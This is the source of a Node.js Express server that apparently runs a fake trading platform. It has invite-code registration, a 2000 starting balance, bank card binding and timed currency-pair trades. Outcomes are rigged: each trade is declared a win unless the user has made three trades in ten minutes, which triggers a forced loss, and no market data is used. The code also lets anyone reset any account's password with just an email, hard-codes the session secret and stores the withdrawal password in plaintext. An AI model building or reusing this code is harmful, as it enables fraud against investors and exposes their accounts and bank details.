const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const svgCaptcha = require('svg-captcha');
const bcrypt = require('bcryptjs');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');

const app = express();
const port = 3000;

// Database setup
const adapter = new FileSync('db.json');
const db = low(adapter);
db.defaults({ users: [], trades: [] }).write();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(session({ secret: 'auth-secret', resave: false, saveUninitialized: true }));

// Homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/index.html'));
});

// Captcha generation
app.get('/captcha', (req, res) => {
  const captcha = svgCaptcha.create({
    noise: 2,
    color: true,
    background: '#ffffff',
    width: 150,
    height: 50,
    fontSize: 45,
    charPreset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
  });

  let svg = captcha.data;
  svg = svg.replace(/(<text[^>]*?)fill="[^"]*"/g, '$1fill="black"');
  svg = svg.replace(/(<text[^>]*?)style="[^"]*fill:[^;"]*;?[^"]*"/g, '$1style="fill:black"');
  svg = svg.replace(/(<text[^>]*?)y="\d+"/g, '$1y="40"');

  req.session.captcha = captcha.text;
  res.type('svg').send(svg);
});

// Register
app.post('/register', (req, res) => {
  const { email, password, confirmPassword } = req.body;
  const inviteCode = 'nikki23';

  if (password !== confirmPassword) {
    return res.json({ success: false, message: 'Passwords do not match.' });
  }

  const existing = db.get('users').find({ email }).value();
  if (existing) {
    return res.json({ success: false, message: 'User already exists.' });
  }

  const hashed = bcrypt.hashSync(password, 10);
  db.get('users').push({
    email,
    password: hashed,
    inviteCode,
    balance: 2000,
    trades: []
  }).write();

  return res.json({ success: true });
});

// Login
app.post('/login', (req, res) => {
  const { email, password, captcha } = req.body;

  if (captcha !== req.session.captcha) {
    return res.json({ success: false, message: 'Invalid captcha.' });
  }

  const user = db.get('users').find({ email }).value();
  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.json({ success: false, message: 'Invalid email or password.' });
  }

  req.session.user = {
    email,
    inviteCode: user.inviteCode || 'nikki23'
  };

  return res.json({ success: true });
});

// Profile data
app.get('/profile-data', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Not logged in' });

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ error: 'User not found' });

  const { email, inviteCode, bank, balance } = user;
  res.json({ email, inviteCode, bank, balance });
});

// Reset password
app.post('/reset-password', (req, res) => {
  const { email, captcha, newPassword } = req.body;

  if (captcha !== req.session.captcha) {
    return res.json({ success: false, message: 'Invalid captcha.' });
  }

  const user = db.get('users').find({ email }).value();
  if (!user) return res.json({ success: false, message: 'Email not found.' });

  const hashed = bcrypt.hashSync(newPassword, 10);
  db.get('users').find({ email }).assign({ password: hashed }).write();

  return res.json({ success: true });
});

// Withdraw password
app.post('/update-withdraw-password', (req, res) => {
  const { withdrawPassword } = req.body;

  if (!req.session.user) return res.status(401).json({ error: "Unauthorized" });
  if (!withdrawPassword || withdrawPassword.length < 4)
    return res.status(400).json({ error: "Invalid password" });

  db.get('users')
    .find({ email: req.session.user.email })
    .assign({ withdrawPassword })
    .write();

  res.json({ success: true });
});

// Bind bank card
app.post('/bind-bank-card', (req, res) => {
  const { bankName, accountNumber, accountHolderName } = req.body;
  if (!req.session.user) return res.status(401).json({ message: 'Not logged in' });

  if (!bankName || !accountNumber || !accountHolderName) {
    return res.status(400).json({ message: 'Missing bank card information' });
  }

  db.get('users')
    .find({ email: req.session.user.email })
    .assign({
      bank: {
        bankName,
        accountNumber,
        accountHolderName
      }
    })
    .write();

  return res.json({ success: true });
});

// Place trade - store as pending, balance updated after timeframe, apply forced loss if >3 trades in 10min
app.post('/place-trade', (req, res) => {
  if (!req.session.user) return res.status(401).json({ success: false, message: 'Not logged in' });

  const { pair, direction, amount, profitPercent, timeframe } = req.body;

  if (
    !pair || !direction || !amount || profitPercent === undefined || !timeframe
  ) {
    return res.json({ success: false, message: 'Missing trade parameters' });
  }

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ success: false, message: 'User not found' });

  const tradeAmount = parseFloat(amount);
  const profitPct = parseFloat(profitPercent);
  const tradeTimeframe = parseInt(timeframe, 10);

  if (
    isNaN(tradeAmount) || tradeAmount <= 0 ||
    tradeAmount > user.balance
  ) {
    return res.json({ success: false, message: 'Invalid trade amount or insufficient balance' });
  }

  if (isNaN(profitPct) || profitPct < 0) {
    return res.json({ success: false, message: 'Invalid profit percent' });
  }

  if (isNaN(tradeTimeframe) || tradeTimeframe <= 0) {
    return res.json({ success: false, message: 'Invalid timeframe' });
  }

  const TEN_MINUTES_MS = 10 * 60 * 1000;
  const now = Date.now();

  // Count trades in last 10 minutes
  const recentTradesCount = (user.trades || []).filter(t => now - new Date(t.timestamp).getTime() <= TEN_MINUTES_MS).length;

  // This trade is forced loss if 3 or more trades in last 10 minutes
  const isForcedLoss = recentTradesCount >= 3;

  // Create trade object with status 'pending' and store trade start time
  const trade = {
    id: now,
    pair,
    direction,
    amount: tradeAmount,
    profitPercent: profitPct,
    timeframe: tradeTimeframe,
    timestamp: new Date(now).toISOString(),
    startTime: now,
    status: 'pending',
    profit: 0,
    result: null,
    forcedLoss: isForcedLoss  // flag for forced loss
  };

  // Push trade but DO NOT update balance yet
  db.get('users')
    .find({ email: req.session.user.email })
    .get('trades')
    .push(trade)
    .write();

  return res.json({
    success: true,
    trade,
    balance: user.balance.toFixed(2),  // balance unchanged at this point
  });
});

// Background job: finalize trades after timeframe, check forcedLoss to set result and adjust balance accordingly
setInterval(() => {
  const users = db.get('users').value();
  const now = Date.now();

  users.forEach(user => {
    let updated = false;

    (user.trades || []).forEach(trade => {
      if (trade.status === 'pending' && now >= trade.startTime + trade.timeframe * 1000) {
        let profitAmount;
        let result;

        if (trade.forcedLoss) {
          // Forced loss: user loses amount * profitPercent
          profitAmount = -(trade.amount * (trade.profitPercent / 100));
          result = 'LOSS';
        } else {
          // Normal win
          profitAmount = trade.amount * (trade.profitPercent / 100);
          result = 'WIN';
        }

        db.get('users')
          .find({ email: user.email })
          .assign({ balance: user.balance + profitAmount })
          .get('trades')
          .find({ id: trade.id })
          .assign({
            profit: profitAmount.toFixed(2),
            result: result,
            status: 'completed'
          })
          .write();

        updated = true;
      }
    });

    if (updated) {
      // Optional: logging or notifications could happen here
    }
  });
}, 5000); // every 5 seconds

// New endpoint: get active pending trade and remaining time, if any
app.get('/active-trade', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Not logged in' });

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ error: 'User not found' });

  const pendingTrade = (user.trades || []).find(t => t.status === 'pending');

  if (!pendingTrade) {
    return res.json({ active: false });
  }

  const now = Date.now();
  const elapsed = now - pendingTrade.startTime;
  const remaining = pendingTrade.timeframe * 1000 - elapsed;

  return res.json({
    active: true,
    trade: pendingTrade,
    remaining: remaining > 0 ? Math.ceil(remaining / 1000) : 0
  });
});

// Trade history
app.get('/trade-history', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Not logged in' });

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ error: 'User not found' });

  const trades = user.trades || [];
  res.json({ trades });
});

// Change password
app.post('/change-password', (req, res) => {
  const { oldPassword, newPassword, confirmPassword } = req.body;

  if (!req.session.user) return res.status(401).json({ success: false, message: 'Not logged in' });

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ success: false, message: 'User not found' });

  if (!bcrypt.compareSync(oldPassword, user.password)) {
    return res.json({ success: false, message: 'Old password is incorrect' });
  }

  if (newPassword !== confirmPassword) {
    return res.json({ success: false, message: 'New passwords do not match' });
  }

  const hashed = bcrypt.hashSync(newPassword, 10);
  db.get('users').find({ email: user.email }).assign({ password: hashed }).write();

  return res.json({ success: true });
});

// Logout
app.post('/logout', (req, res) => {
  req.session.destroy(() => {
    res.json({ success: true });
  });
});

// Protect bankcard.html route from unauthorized access
app.get('/bankcard.html', (req, res, next) => {
  if (!req.session.user) return res.redirect('/login.html');
  next();
});

// Start server
app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
